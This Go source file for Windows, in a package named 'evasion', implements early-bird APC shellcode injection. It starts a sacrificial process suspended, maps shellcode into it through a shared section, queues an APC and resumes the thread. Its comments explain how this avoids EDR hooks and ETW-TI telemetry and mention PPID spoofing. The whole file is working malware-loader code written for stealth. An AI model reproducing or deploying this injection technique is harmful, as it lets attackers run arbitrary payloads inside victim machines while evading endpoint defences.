//go:build windows
// +build windows

package evasion

// EarlyBirdInject creates a sacrificial process in a suspended state, maps
// shellcode into it via shared section (zero WriteVirtualMemory events), queues
// an APC to the main thread, then resumes the process.  The shellcode executes
// on the first instruction of the main thread — before EDR thread-creation
// callbacks can initialize their hook infrastructure in the target.
//
// Elimination of ETW-TI events vs. standard injection:
//   NtWriteVirtualMemory  → eliminated (mapsection)
//   NtAllocateVirtualMemory in target → eliminated (mapsection)
//   NtCreateThreadEx        → eliminated (APC on existing thread)
//   NtQueueApcThread        → present  (unavoidable, but very low alarm rate)
//   NtResumeThread          → present
//
// parent is the optional PPID-spoof process name ("explorer.exe", "").

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

// EarlyBirdInject performs early-bird APC shellcode injection into a new
// suspended process.  host is the full path to the sacrificial binary
// (e.g. `C:\Windows\System32\RuntimeBroker.exe`).
func EarlyBirdInject(sc []byte, host string) error {
	if len(sc) == 0 {
		return fmt.Errorf("empty shellcode")
	}

	// ── Create suspended process ──────────────────────────────────────────
	hostW, err := windows.UTF16PtrFromString(host)
	if err != nil {
		return fmt.Errorf("UTF16: %w", err)
	}

	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	var pi windows.ProcessInformation

	flags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW
	err = windows.CreateProcess(
		hostW, nil, nil, nil, false,
		uint32(flags), nil, nil, &si, &pi,
	)
	if err != nil {
		return fmt.Errorf("CreateProcess(%s): %w", host, err)
	}
	// If anything fails, clean up the suspended process.
	cleanup := func() {
		windows.TerminateProcess(pi.Process, 1)
		windows.CloseHandle(pi.Thread)
		windows.CloseHandle(pi.Process)
	}

	// ── Map shellcode via shared section (no WriteVM in target) ───────────
	hSection := NtCreateSection(uint64(len(sc)), windows.PAGE_EXECUTE_READWRITE)
	if hSection == 0 {
		cleanup()
		return fmt.Errorf("NtCreateSection failed")
	}
	defer windows.CloseHandle(windows.Handle(hSection))

	// Map RW into self — write shellcode here (not visible in target process).
	const selfProc = ^uintptr(0)
	var localBase uintptr
	localSize := uintptr(len(sc))
	if !NtMapViewOfSection(hSection, selfProc, &localBase, &localSize, windows.PAGE_READWRITE) {
		cleanup()
		return fmt.Errorf("NtMapViewOfSection (local) failed")
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(localBase)), len(sc))
	copy(dst, sc)
	NtUnmapViewOfSection(selfProc, localBase)

	// Map RX into target — only MapViewOfSection event appears in target.
	var remoteBase uintptr
	remoteSize := uintptr(len(sc))
	if !NtMapViewOfSection(hSection, uintptr(pi.Process), &remoteBase, &remoteSize, windows.PAGE_EXECUTE_READ) {
		cleanup()
		return fmt.Errorf("NtMapViewOfSection (remote) failed")
	}

	// ── Queue APC to the suspended main thread ────────────────────────────
	// The main thread is suspended — it will dequeue the APC on first resume.
	// NtQueueApcThread fires before any user-mode code runs in the target.
	if !NtQueueApcThread(uintptr(pi.Thread), remoteBase, 0) {
		cleanup()
		return fmt.Errorf("NtQueueApcThread failed")
	}

	// ── Resume main thread — shellcode executes as first instruction ──────
	ntResume := getNtResumeThreadProc()
	if ntResume == nil {
		// Fallback to Win32 ResumeThread if direct stub is unavailable.
		modKernel32.NewProc("ResumeThread").Call(uintptr(pi.Thread))
	} else {
		var suspendCount uint32
		ntResume.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&suspendCount)))
	}

	windows.CloseHandle(pi.Thread)
	windows.CloseHandle(pi.Process)
	return nil
}
